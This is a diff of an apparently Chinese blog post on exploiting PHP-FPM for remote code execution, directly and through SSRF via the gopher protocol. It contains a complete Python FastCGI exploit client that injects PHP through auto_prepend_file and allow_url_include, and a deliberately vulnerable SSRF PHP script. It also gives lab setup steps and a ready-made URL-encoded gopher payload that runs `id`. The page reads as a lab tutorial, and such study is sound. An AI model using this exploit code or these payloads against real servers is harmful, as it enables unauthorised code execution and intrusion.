https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br></pre></td></tr></table></figure>
+
 
 <h3 id="ssrf-fpm"><a href="#ssrf-fpm" class="headerlink" title="ssrf+fpm"></a>ssrf+fpm</h3><p>利用gopher协议</p>
 <p>先装环境ubuntu18</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y nginx</span><br><span class="line">sudo apt install -y software-properties-common</span><br><span class="line">sudo add-apt-repository -y ppa:ondrej/php</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y php7.3-fpm</span><br></pre></td></tr></table></figure>
-
 <p>改配置nginx</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-enabled/default</span><br><span class="line"></span><br><span class="line">改成这样</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">                include snippets/fastcgi-php.conf;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#       # With php-fpm (or other unix sockets):</span></span><br><span class="line">        <span class="comment">#       fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;</span></span><br><span class="line">        <span class="comment">#       # With php-cgi (or other tcp sockets):</span></span><br><span class="line">                fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
 <p>再去改php-fpm的配置</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/php/7.3/fpm/pool.d/www.conf</span><br><span class="line">改成这样</span><br><span class="line">listen = 127.0.0.1:9000</span><br></pre></td></tr></table></figure>
-
 <p>重启fpm</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/php7.3-fpm restart</span><br></pre></td></tr></table></figure>
-
 <p>启动nginx</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure>
+
 
 <p>创建一个phpinfo文件</p>
 <p>phpin.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>用来查看是不是FPM/FASTCGI模式启动，正常情况下phpinfo里面会有这样一行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server API 	FPM/FastCGI</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server API 	FPM&#x2F;FastCGI </span><br></pre></td></tr></table></figure>
+
 
 <p>测试</p>
 <p>ssrf.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">                $ch = curl_init();</span><br><span class="line">                curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">                curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">                curl_exec($ch);</span><br><span class="line">                curl_close($ch); </span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable">$ch</span> = curl_init();</span><br><span class="line">                curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">                curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">                curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">                curl_close(<span class="variable">$ch</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 
 <p>改一下p神的脚本，把发送数据那部分去掉</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &apos;gopherfpm.py&apos; 127.0.0.1 /var/www/html/phpin.php -c &apos;&lt;?php echo `id`; exit;?&gt;&apos; -p 9000</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &#39;gopherfpm.py&#39; 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;phpin.php -c &#39;&lt;?php echo &#96;id&#96;; exit;?&gt;&#39; -p 9000</span><br></pre></td></tr></table></figure>
 <p>生成数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A9000/_%01%01%2C%04%00%08%00%00%00%01%00%00%00%00%00%00%01%04%2C%04%01%DB%00%00%0E%02CONTENT_LENGTH24%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/phpin.php%0B%17SCRIPT_NAME/var/www/html/phpin.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/phpin.php%01%04%2C%04%00%00%00%00%01%05%2C%04%00%18%00%00%3C%3Fphp%20echo%20%60id%60%3B%20exit%3B%3F%3E%01%05%2C%04%00%00%00%00</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A&#x2F;&#x2F;127.0.0.1%3A9000&#x2F;_%01%01%2C%04%00%08%00%00%00%01%00%00%00%00%00%00%01%04%2C%04%01%DB%00%00%0E%02CONTENT_LENGTH24%0C%10CONTENT_TYPEapplication&#x2F;text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;phpin.php%0B%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;phpin.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT&#x2F;%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;phpin.php%01%04%2C%04%00%00%00%00%01%05%2C%04%00%18%00%00%3C%3Fphp%20echo%20%60id%60%3B%20exit%3B%3F%3E%01%05%2C%04%00%00%00%00</span><br></pre></td></tr></table></figure>
 <p>这里要二次编码，注意只把后面的数据部分编码。gopher协议这里不要编码</p>
